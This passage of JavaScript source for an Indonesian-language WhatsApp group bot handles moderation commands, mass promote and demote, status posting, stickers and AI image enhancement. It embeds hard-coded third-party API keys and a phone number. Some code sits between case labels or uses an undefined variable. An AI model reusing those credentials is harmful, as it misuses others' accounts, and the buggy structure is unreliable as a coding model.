    fs.writeFileSync('./database/warns.json', JSON.stringify(warns, null, 2));
}
break;
case 'warn': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator)) return m.reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);
    if (!isBotAdmins) return reply(mess.badm);
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (users === ownerNumber)
     return reply('Itu owner saya, tidak bisa diberi peringatan!!!');
    if(users === botNumber) 
    return reply('Tidak bisa memberi peringatan kepada saya 😡');
     if (!warns[m.chat]) {
        warns[m.chat] = {};
    }
    if (!warns[m.chat][users]) {
        warns[m.chat][users] = 0;
    }
    const groupMetadata = await KhaerulZx.groupMetadata(m.chat);
    const groupName = groupMetadata.subject;
    warns[m.chat][users] += 1;
    if (warns[m.chat][users] >= 3) {
        await KhaerulZx.groupParticipantsUpdate(m.chat, [users], 'remove');
        reply(`Anggota @${users.split('@')[0]} telah dikeluarkan dari grup karena menerima 3 peringatan.`);
        delete warns[m.chat][users];
        await KhaerulZx.sendMessage(users, { text: `Anda telah dikeluarkan dari grup *${groupName}* karena menerima 3 peringatan.` });
    } else {
        reply(`Anggota @${users.split('@')[0]} telah diberi peringatan. Total peringatan: ${warns[m.chat][users]}\nAnggota akan dikeluarkan jika menerima 3 peringatan.`);
        await KhaerulZx.sendMessage(users, { text: `Anda telah menerima peringatan di grup *${groupName}*. Total peringatan Anda: ${warns[m.chat][users]}` });
    }
    fs.writeFileSync('./database/warns.json', JSON.stringify(warns, null, 2));
}
break;
case 'kick-sider': {
 if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
 if (!m.isGroup) return reply(mess.group)
 var lama = 86400000 * 7 // 7 hari
 const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
 const milliseconds = new Date(now).getTime()
 const groupMetadata = await KhaerulZx.groupMetadata(m.chat);
 let member = groupMetadata.participants.map(v => v.id)
 var pesan = q || "Harap aktif di grup karena akan ada pembersihan member setiap saat"
 var total = 0
 var sider = []
 for (let i = 0; i < member.length; i++) {
   let user = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
   let userData = global.db.data.users[member[i]]
   if (
     (!userData || milliseconds - userData.lastseen > lama) 
     && !user.isAdmin 
     && !user.isSuperAdmin
   ) {
     total++
     sider.push(member[i])
   }
 }
 if (total == 0) return reply(`*Digrup ini tidak terdapat sider.*`)
 reply(`*${total}/${member.length}* anggota grup *${groupMetadata.subject}* adalah sider dan akan dikeluarkan:\n\n*LIST SIDER:*\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '') + ' (' + (global.db.data.users[v] ? msToDate(milliseconds - global.db.data.users[v].lastseen) : 'Tidak Ada Data') + ')').join('\n')}`, m, {
   contextInfo: {
     mentionedJid: sider
   }
 })
 for (let i = 0; i < sider.length; i++) {
   await KhaerulZx.groupParticipantsUpdate(m.chat, [sider[i]], 'remove')
 }
}
const more2 = String.fromCharCode(8206)
const readMore2 = more.repeat(4001)
function msToDate(ms) {
 let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
 let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
 let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
 return `${d}H ${h}J ${m}M`
}
break
case 'promote': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);
    if (!isBotAdmins) return reply(mess.badm);
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : null;
    if (!users) return reply(`Tag atau reply pesan yang ingin di ${command}`);
    await KhaerulZx.groupParticipantsUpdate(from, [users], 'promote');
    reply(mess.done);
}
break;
case 'demote': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);
    if (!isBotAdmins) return reply('Apacoba bot bukan admin');
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : null;
    if (!users) return reply(`Tag atau reply pesan yang ingin di ${command}`);
    await KhaerulZx.groupParticipantsUpdate(from, [users], 'demote');
    reply(mess.done);
}
break;
case 'kick': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin);
    if (!m.isGroup) return reply(mess.group);
    if (!isBotAdmins) return reply(mess.badm);
    let users = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : null;

    if (!users) return reply(`Tag atau reply pesan yang ingin di ${command}`);

    await KhaerulZx.groupParticipantsUpdate(from, [users], 'remove');
    reply(mess.done);
}
break;
case 'add': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await KhaerulZx.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'demoteall': {
if (banned.includes(m.sender)) {
    return;
    }
 if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV')
 if (!isCreator) return reply('Khusus Owner')
 if (!isBotAdmins) return reply('Bot harus admin')
  const xeondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `62895392968503@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `62895392968503@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xeondemoteall) {
 await KhaerulZx.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 reply(`Success`);
}
break
case 'promoteall': {
if (banned.includes(m.sender)) {
    return;
    }
 if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV')
 if (!isCreator) return reply('Khusus Owner')
 if (!isBotAdmins) return reply('Bot harus admin')
  const xeonpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `62895392968503@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `62895392968503@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await KhaerulZx.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 reply(`Success`);
}
break

/*
This feature using APIs from ai.xterm.codes
*/

case 'lora': {
if (banned.includes(m.sender)) {
    return;
    }
    let [text1, text2] = text.split("|")
    console.log({ text1, text2 })
    
    if (!text1 || !text2) {
        return reply(`*Here is Tutorial!*\n\n*Pay attention to the following instructions!*\n[ StableDiffusion - Lora++ ]\n\nUsage: <prefix><command> <ID>|<prompt>\nExample: #lora 3|beautiful cat with aesthetic jellyfish, sea god theme\n\n => _ID is the number of models available in the list_\n\n_*please see the list of available models:*_\n\n*[ID] [NAME]*\n \n[1] [Donghua#01]\n[2] [YunXi - PerfectWorld]\n[3] [Sea God (Tang San) - Douluo Dalu]\n[4] [XiaoYiXian - Battle Through the Heavens]\n[5] [God of Angels (Xian Renxue) - Douluo Dalu]\n[6] [Sheng Cai'er - Throne of Seals]\n[7] [HuTao - Genshin Impact]\n[8] [TangWutong - Unrivaled Tang Sect]\n[9] [CaiLin (Medusa) - Battle Through the Heavens]\n[10] [Elaina - Majo No TabiTabi]\n[11] [Jiang Nanan - The Unrivaled Tang Sect]\n[12] [Cailin (Queen Medusa) - BTTH [ 4KUltraHD]]\n[13] [MaXiaoTao - The Unrivaled Tang Sect]\n[14] [Yor Forger - Spy x Family]\n[15] [Boboiboy Galaxy]\n[16] [Hisoka morow]\n[17] [Ling Luochen - Unrivaled Tang Sect]\n[18] [Tang Wutong - Unrivaled Tang Sect]\n[19] [Huo Yuhao - Unrivaled Tang Sect]`)
    }

    let imageUrl = `https://ai.xterm.codes/api/text2img/instant-lora?id=${encodeURIComponent(text1)}&prompt=${encodeURIComponent(text2)}&key=Bell409`
    
    await KhaerulZx.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m })
}
break
case "jadinyata":
case "toreal": {
if (banned.includes(m.sender)) {
    return;
    }
   if (!quoted) return reply(`Fotonya Mana?`);
  if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
  reply(mess.wait);
  let tryng = 0;
  const media = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
  let pok = await TelegraPh(media);
    try {
    let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=Bell409`).then(a => a.json());
      if (!ai.status) return ai;
  console.log(ai);
        while (tryng < 55) {
      let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
      if (s.status === 1) {
      console.log("Starting...");
    } 
     if (s.status === 2) {
      console.log("Processing...");
    } 
      if (s.status == 3) {
        return KhaerulZx.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
      }
            if (s.status == 4) {
        return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
      }
            await new Promise(resolve => setTimeout(resolve, 2000));
    }
  } catch (e) {
    console.error(e);
    reply(`Type-Err! :\n${e}`);
  }
}
break;
case 'totag': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(mess.group)
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               KhaerulZx.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
    
case 'hidetag': case 'h': {
if (banned.includes(m.sender)) {
    return;
    }
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!m.isGroup) return reply(mess.group)
let tek = m.quoted ? quoted.text : (text ? text : "")
const fkontak = {
	"key": {
    "participants":"0@s.whatsapp.net",
		"remoteJid": "status@broadcast",
		"fromMe": false,
		"id": "Halo"
	},
	"message": {
		"contactMessage": {
			"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
		}
	},
	"participant": "0@s.whatsapp.net"
}

    KhaerulZx.sendMessage(m.chat, { text: text, mentions: participants.map(a => a.id) }, {quoted:fkontak})
    }
break

case 'listonline':
case 'liston': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!m.isGroup) {
        return reply('Fitur ini khusus untuk digunakan di dalam grup!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!');
    }
    let id = args.length > 0 && /\d+-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
    console.log(store.presences);
    if (!store.presences || !store.presences[id]) {
        return reply('Tidak dapat mengakses data kehadiran (presences) saat ini.');
    }
    let online = [...Object.keys(store.presences[id]), botNumber];
    KhaerulZx.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join('\n'), m, {
        mentions: online
    });
}
break;
 /*case 'listonline':
            case 'liston': {
            if (banned.includes(m.sender)) {
    return;
    }
                if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join grup bot : https://chat.whatsapp.com/Imb09rrEUGG2fylHNRXyQV!')
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                KhaerulZx.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
            */

case 'tagall': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
KhaerulZx.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break
case 'totalfeature':{
if (banned.includes(m.sender)) {
    return;
    }
let totalf = `
*TOTAL FEATURE*

> • Total ${totalFitur()} Fitur\n> • Tipe : Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
reply(totalf)
}
break
case 'closetime':
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
KhaerulZx.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break
  
case 'opentime':
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
KhaerulZx.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
break
//=================================================//
/*case 'hdvid' :
case 'vidhd' :{
  try {
const media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh(media)
const response = await fetch(`https://api.alyachan.dev/api/vid-enhance?video=${anuu}&apikey=zCQtoY`)
const hasil = await response.json();
const vidhd = hasil.data.url;
const caption = `sukses membuat video menjadi hd\ndurasi: ${hasil.data.duration}\nsize: ${hasil.data.size}`
KhaerulZx.sendMessage(m.chat, { caption: caption, video: { url: vidhd }}, {quoted:m});
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
}
break */
const ffmpegPath = require('ffmpeg-static');
const ffmpeg = require('fluent-ffmpeg');
const { PassThrough } = require('stream');
const path = require('path');
ffmpeg.setFfmpegPath(ffmpegPath);
case 'hdvid':
case 'hdvidio':
case 'hdvideo': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!/video/.test(mime)) {
        return m.reply(`Kirim atau kutip video dengan caption ${prefix + command}`);
    }
    await KhaerulZx.sendMessage(m.chat, { react: { text: "🔎", key: m.key } });
    let media = await quoted.download();

    async function enhanceVideo(inputBuffer) {
        return new Promise((resolve, reject) => {
            const outputStream = new PassThrough(); // Stream output

            ffmpeg()
                .input(inputBuffer)
                .videoFilter('eq=contrast=1.2:brightness=0.1')
                .format('mp4')
                .pipe(outputStream, { end: true })
                .on('error', (err) => {
                    reject(err);
                });
const chunks = [];
            outputStream.on('data', (chunk) => {
                chunks.push(chunk);
            });
            outputStream.on('end', () => {
                resolve(Buffer.concat(chunks));
            });
        });
    }

    try {
        let processedVideo = await enhanceVideo(media);
        await KhaerulZx.sendMessage(
            m.chat,
            { video: processedVideo, caption: 'Sukses meningkatkan kualitas video!' },
            { quoted: m }
        );
    } catch (error) {
        console.error('Error:', error);
        m.reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
    }
}
break;
case 'hdr': case 'remini': case 'hd':
case 'hdr-1': case 'remini-1': case 'hd-1':
case 'hd-max': case 'hdmax': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Kak Limit Anda Habis Ingin Membeli Limit Ketik .buylimit');
    db.data.users[sender].limit -= 1; // -1 limit

    if (!quoted) return reply(`Where is the picture?`);
    if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`);
    
    reply(mess.wait);
    const { remini } = require('./lib/remini');
    let media = await quoted.download();

    let hasil = media;
    let prosesCount = (command === 'hd-max' || command === 'hdmax') ? 7 : 1;

    try {
        for (let i = 0; i < prosesCount; i++) {
            hasil = await remini(hasil, "enhance");
        }
        KhaerulZx.sendMessage(m.chat, { image: hasil, caption: mess.success }, { quoted: fcall });
    } catch (error) {
        console.error('Error processing image enhancement:', error);
        m.reply('Fitur eror, silahkan gunakan .hd2');
    }
}
break;
case 'getdb': {
if (!isCreator) return reply('Khusus Owner')
KhaerulZx.sendMessage(from, {document: fs.readFileSync('./database/database.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'database.json' }, {quoted: m})
}
break			
case 'getcase': {
if (banned.includes(m.sender)) {
    return;
    }

const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./hanako.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isCreator) return reply('Mau ngapain')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }
}
        break 
        
        case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `「 SUCCES TERDAFTAR 」

  • Phone Number : @${m?.sender.split('@')[0]}
  • Name User : ${pushname}
  • Status Verify : Berhasil
  • ID User : ${serialUser}

Done Bwang Kuhhh Kamu Sekarang Sudah Bisa Mengakses FInsii AI Abangkuhh Btw Limit akan di reset setiap harinya, tapi jika kamu ingin membeli limit silahkan hubungi .owner`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
KhaerulZx.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `R E G I S T E R E D`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
KhaerulZx.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break
        
case 'biochange': {
if (banned.includes(m.sender)) {
    return;
    }
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah AutoBio Ke ${q}`)
                }
                }
                break   
case 'readchange': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
}
break
case 'scolong': case 'wm': {
if (banned.includes(m.sender)) {
    return;
    }
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await KhaerulZx.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break
case 'sticker': case 's': case 'stickergif': case 'sgif': case 'stiker': {
    if (banned.includes(m.sender)) return;
    if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`;
    const isViewOnce = quoted?.message?.viewOnceMessage;
    const mimeType = isViewOnce ? quoted.message.viewOnceMessage.message.imageMessage?.mimetype || quoted.message.viewOnceMessage.message.videoMessage?.mimetype : mime;

    if (/image/.test(mimeType)) {
        let media = await quoted.download();
        let encmedia = await KhaerulZx.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mimeType)) {
        const duration = (quoted.message.viewOnceMessage?.message?.videoMessage || quoted.msg || quoted).seconds;
        if (duration > 11) return reply('Maksimal 10 detik!');
        
        let media = await quoted.download();
        let encmedia = await KhaerulZx.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else {
        throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`;
    }
}
break;
case 'public': {
if (!isCreator) return reply(mess.owner) 
KhaerulZx.public = true
reply('SUCCES PUBLIC KAK KhaerulZx')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner) 
KhaerulZx.public = false
reply('SUCCES SELF KAK KhaerulZx')
}
break
case 'profile': case 'me': {
if (banned.includes(m.sender)) {
    return;
    }
let limitz = db.data.users[m.sender].limit;
let sender = m.sender;
    let ppUrl = await KhaerulZx.profilePictureUrl(sender, 'image').catch((_) => "https://telegra.ph/file/34d343582a1cf8f830a28.jpg");
    let pp = await (await fetch(ppUrl)).buffer();

    let yyye = `
—  *P R O F I L E*

┌  ◦  *Name* : ${pushname}
│  ◦  *Nomer* : @${m?.sender.split('@')[0]}
│  ◦  *Terdaftar* : Yes
│  ◦  *Status User* : ${isCreator ? 'Premium' : 'Free'}
│  ◦  *Saldo* : Rp${toRupiah(cekSaldo(sender, db_saldo))}_
└  ◦  *Limit* : ${limitz}

*_KETIK .MENU MENAMPILKAN BUTTON LIST_*
*_KETUK BUTTON DAN DISPLAY ALLMENU_*
*_KETIK .OWNER MELIHAT KONTAK OWNER_*
    `.trim();

await KhaerulZx.sendMessage(m.chat, {
text: yyye,
contextInfo: {
externalAdReply: {  
title: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ ꜰɪɴꜱɪɪ',
body: `ꜰɪɴꜱɪɪ ᴀɪ`,
thumbnailUrl: ppUrl,
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:m})
}
break
case 'statusvn': case 'vnsw': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply("Owners only")
if (/audio/.test(mime)) {
var audiosw = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
await KhaerulZx.sendMessage('status@broadcast', {
audio: {
url: audiosw
},
mimetype: 'audio/mp4',
ptt: true
}, {
backgroundColor: '#FF000000',
statusJidList: Object.keys(global.db.data.users)
})
await reply(mess.success)
} else {
reply('Reply to audio')
}
}
break
case 'upswteks': {
if (banned.includes(m.sender)) {
    return;
    }
               if (!isCreator) return reply("Owners only")
               if (!q) return reply('Text?')
               await KhaerulZx.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply(mess.success)
            }
            break
case 'statusvid' : {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply("Owners only")
if (/video/.test(mime)) {
var videosw = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
await KhaerulZx.sendMessage('status@broadcast', {
video: {
url: videosw
},
caption: q ? q : ''
}, {
statusJidList: Object.keys(global.db.data.users)
})
await reply(mess.success)
} else {
reply('Reply to video')
}
}
break
        case "upsw": {
        if (banned.includes(m.sender)) {
    return;
    }
          if (!isCreator) return reply("Owners only");
          if (args.length < 1) return reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
            await KhaerulZx.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: global.db.data.users },
            );
            reply("Udah Hiyuu, Liat Aja Kalo Ga Percaya 😋");
          } else if (/video/.test(mime)) {
            let VidSw = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
            await KhaerulZx.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: global.db.data.users },
            );
            reply("Done");
          } else if (/audio/.test(mime)) {
            let VnSw = await KhaerulZx.downloadAndSaveMediaMessage(quoted);
            await KhaerulZx.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },
              { backgroundColor: "#d3d3d3", statusJidList: global.db.data.users }, // #d3d3d3
            );
            reply("Done");
          } else if (q) {
            KhaerulZx.sendMessage(
              "status@broadcast",
              { text: q },
              {
                backgroundColor: "#FF000000",
                font: 3,
                statusJidList: global.db.data.users,
              },
            );
          } else {
            reply(
              "Replay Media Jika Mau Dengan Caption Ketik .upsw caption",
            );
          }
        }
        break;
/**
 * 
 * [ *CASE DOWNLOAD STATUS* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */
//SUMBER : https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i

//DON'THAPUS SUMBER
case 'ceklink': {
if (banned.includes(m.sender)) {
    return;
    }
  let url = m.quoted && m.quoted.text
  if (!url) {
    await reply('Silakan reply pesan url.')
  }
  async function checkLoginPage(url) {
  if (url.endsWith('.com')) {
    return false
  }

  let response = await fetch(url)
  let text = await response.text()
  const loginElements = ['<form', 'input type="password"', 'input type="email"', 'input type="text"']
  const suspiciousMeta = ['csrf-token', 'robots']

  for (let element of loginElements) {
    if (text.toLowerCase().includes(element)) {
      return true
    }
  }

  for (let meta of suspiciousMeta) {
    let metaTag = new RegExp(`<meta[^>]*name="${meta}"[^>]*>`, 'i')
    if (metaTag.test(text)) {
      return true
    }
  }
  return false
}

  let isLoginPage = await checkLoginPage(url)

  let detect = isLoginPage 
    ? 'Website ini memiliki elemen login atau meta tag mencurigakan. Hati-hati jika anda ingin memasuki web tersebut....' 
    : 'Website ini tidak terdeteksi memiliki elemen login atau meta tag mencurigakan.'

  await KhaerulZx.sendMessage(m.chat, {text: detect}, {quoted: m})
}
break
case 'loadstatus': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!q) return reply("Reply status temanmu lalu ketik .loadstatus")
try {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await KhaerulZx.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        KhaerulZx.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        reply('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await KhaerulZx.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        KhaerulZx.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        reply('*Downloading status...*');
      }
    }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
}
break
      case "listsw": {
      if (banned.includes(m.sender)) {
    return;
    }
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? KhaerulZx.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await KhaerulZx.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break;
case 'emojimix': { 
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
